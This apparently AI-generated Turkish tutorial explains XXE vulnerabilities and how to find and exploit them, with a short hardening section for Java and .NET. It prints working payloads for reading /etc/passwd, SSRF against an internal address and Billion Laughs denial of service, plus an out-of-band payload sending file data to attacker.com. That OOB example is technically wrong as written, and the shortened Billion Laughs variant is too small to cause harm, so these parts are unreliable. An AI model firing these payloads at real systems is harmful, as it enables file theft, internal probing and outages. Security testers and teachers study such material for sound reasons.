### **XXE (XML External Entity) Zafiyeti: Tespit ve İstismar Rehberi**

XXE (XML External Entity) zafiyeti, bir uygulamanın XML işleme sırasında harici varlıkların (external entity) tanımlanmasına ve işlenmesine izin vermesi durumunda oluşur. Bu zafiyet, hassas dosyaların okunması, iç ağda keşif yapılması ve hatta sistemde komut çalıştırma gibi ciddi sonuçlara yol açabilir.

---

### **1. XXE Zafiyeti Nedir?**
- **Tanım**: XXE, XML verilerinde harici varlıkların tanımlanıp kullanılmasını sağlayarak, hedef sistemde beklenmeyen işlemlere yol açar.
- **Tehlikeleri**:
  - Dosya Okuma: Sistem üzerindeki dosyaları okuma (`/etc/passwd`).
  - SSRF: Hedef sistemi iç ağdaki kaynaklara istek göndermeye zorlamak.
  - Denial of Service (DoS): Billion Laughs Attack gibi yöntemlerle sistemin çökmesine neden olmak.
  - Uzaktan Kod Çalıştırma: Komut çalıştırma veya başka sistemlere erişim.

---

### **2. XXE'nin Tespiti**

#### **2.1. XML Giriş Noktalarını Belirleme**
XXE zafiyeti genellikle aşağıdaki giriş noktalarında bulunur:
- **XML Dosya Yükleme**: Kullanıcıdan XML dosyasının yüklenmesini isteyen özellikler.
- **SOAP API İstekleri**: XML formatında veri alan servisler.
- **REST API'ler**: XML tabanlı POST/PUT istekleri.
- **SAML Tabanlı Uygulamalar**: SAML ile kimlik doğrulama yapan sistemler.

#### **2.2. Fuzzing ve Test Payloadları**
Tespit için basit bir XML dosyası kullanılabilir:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

Bu payload, `/etc/passwd` dosyasını okumaya çalışır. Sunucunun yanıtı, zafiyetin varlığını gösterebilir.

#### **2.3. Araçlar**
- **Burp Suite**: XML tabanlı isteklerde payloadları düzenlemek için idealdir.
- **OWASP ZAP**: Otomatik zafiyet taraması ve manuel testler için kullanılabilir.
- **XXE-Injector**: Otomatik olarak XXE payloadlarını test eder.
- **SOAPUI**: SOAP servislerinde XXE testi yapmak için kullanılır.

---

### **3. XXE İstismar Teknikleri**

#### **3.1. Dosya Okuma**
Sistem üzerindeki hassas dosyaları okuyabilirsiniz:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

- **Amaçlanan Dosyalar**:
  - Linux: `/etc/passwd`, `/etc/shadow`
  - Windows: `C:\Windows\System32\drivers\etc\hosts`

#### **3.2. SSRF (Server-Side Request Forgery)**
XXE üzerinden iç ağdaki kaynaklara erişim sağlanabilir:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1:80/"> ]>
<foo>&xxe;</foo>
```

#### **3.3. Denial of Service (Billion Laughs Attack)**
Sunucunun kaynaklarını tüketmek için kullanılabilir:
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<foo>&lol3;</foo>
```

#### **3.4. Uzaktan Kod Çalıştırma (RCE)**
Bazı durumlarda, bir XXE saldırısı ile kod yürütme sağlanabilir:
- Kullanılabilir protokoller: `php://filter`, `gopher://`, `expect://`.

#### **3.5. Out-of-Band (OOB) XXE**
Eğer sistem yanıtında veri döndürmüyorsa, OOB saldırılarıyla hassas bilgileri başka bir sunucuya yönlendirebilirsiniz:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/?data=file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

---

### **4. Korunma Yöntemleri**
#### **4.1. XML İşleme Özelliklerini Devre Dışı Bırakma**
XXE'yi önlemek için aşağıdaki özellikler devre dışı bırakılmalıdır:
- Java'da:
  ```java
  SAXParserFactory factory = SAXParserFactory.newInstance();
  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
  ```

- .NET'te:
  ```csharp
  XmlReaderSettings settings = new XmlReaderSettings();
  settings.DtdProcessing = DtdProcessing.Prohibit;
  ```

#### **4.2. Girdi Doğrulama**
- Kullanıcı girdilerini beyaz listeye alın.
- Doğrudan XML verisi işlemek yerine, daha güvenli alternatifler (JSON) kullanın.

#### **4.3. Ağ Seviyesi Güvenlik**
- Sunucunun dış ağdan erişimini kısıtlayın.
- Yerel dosya sistemi protokollerine erişimi engelleyin (`file://`).

---

### **5. Araçlar ve Teknikler**
| Araç           | Açıklama                                          |
|----------------|---------------------------------------------------|
| Burp Suite     | XXE payloadlarını düzenlemek ve test etmek.       |
| OWASP ZAP      | Otomatik zafiyet taraması ve manuel testler.      |
| XXE-Injector   | XXE payloadlarını otomatik olarak test eder.      |
| SOAPUI         | SOAP tabanlı servislerde XXE testi için kullanılır. |
| Nuclei         | XXE için önceden tanımlanmış tarama şablonları.   |

---

### **6. XXE Payload Örnekleri**

#### **Basit Dosya Okuma**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

#### **SSRF Payload**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1:80/"> ]>
<foo>&xxe;</foo>
```

#### **Out-of-Band (OOB) XXE**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/?data=file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

#### **Billion Laughs Attack**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;">
]>
<foo>&lol3;</foo>
```

---

Bu rehber, XXE tespiti ve istismarı için kapsamlı bir bilgi sağlamaktadır. Daha fazla pratik yapmak için belirli araçları ve yöntemleri test ortamlarında denemeniz önerilir. Detaylı örnekler ve araçlarla ilgili yardım isterseniz size özel bir senaryo geliştirebiliriz.
